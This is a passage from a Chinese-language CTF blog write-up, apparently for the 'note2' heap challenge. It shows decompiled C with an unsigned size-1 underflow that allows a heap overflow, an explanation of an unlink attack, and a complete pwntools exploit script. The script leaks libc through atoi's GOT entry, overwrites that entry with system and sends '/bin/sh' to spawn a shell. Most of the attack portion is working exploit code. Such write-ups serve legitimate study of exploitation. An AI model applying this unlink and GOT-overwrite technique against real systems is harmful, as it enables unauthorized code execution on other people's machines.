<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4009BD</span><span class="params">(__int64 a1, __int64 size, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]    </span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; size - <span class="number">1</span> &gt; i; ++i )          <span class="comment">//a2是我们输入的size</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们输入的size为0是时，由于malloc的分配机制实际上会分配给我们0x20大小的空间，但是在这个读取数据的函数里size-1（注意size是无符号整数），也就变成了一个超级大的数，我们可以输入任意大小的数据了</p>
<p>拿我们就有思路了，我们可以malloc三个chunk，大小分别为0x80、0（实际上分配的是0x20，由于是小于fast_max，所以会进入fastbin，再次分配0时会从fastbin中取出）、0x80，然后拿chunk2去溢出chunk3，最终实现unlink，剩下的步骤就和上一题目一样了，具体过程不在赘述</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(len,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the length of the note content:(less than 128)"</span>)</span><br><span class="line">    p.sendline(str(len))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the note content:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,choice,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./note2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your name:"</span>)</span><br><span class="line">p.sendline(<span class="string">'zsh'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your address:"</span>)</span><br><span class="line">p.sendline(<span class="string">'sdust'</span>)</span><br><span class="line"></span><br><span class="line">head = <span class="number">0x602120</span></span><br><span class="line">fd = head - <span class="number">0x18</span></span><br><span class="line">bk = head - <span class="number">0x10</span></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x8</span> + p64(<span class="number">0xa0</span>) + p64(fd) + p64(bk) + <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,payload1)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">'b'</span>* <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload3)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content is '</span>)</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">"\n"</span>,drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\00'</span>))</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">"atoi_addr is %x\n"</span> %atoi_addr)</span><br><span class="line">log.success(<span class="string">"libc_base is %x\n"</span> %libc_base)</span><br><span class="line">log.success(<span class="string">"system_addr is %x\n"</span> %system_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system_addr))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Asa9ao</p>
              <p class="site-description motion-element" itemprop="description">It's not who I am underneath, but it's what I do that defines me</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">32</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Asa9ao</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
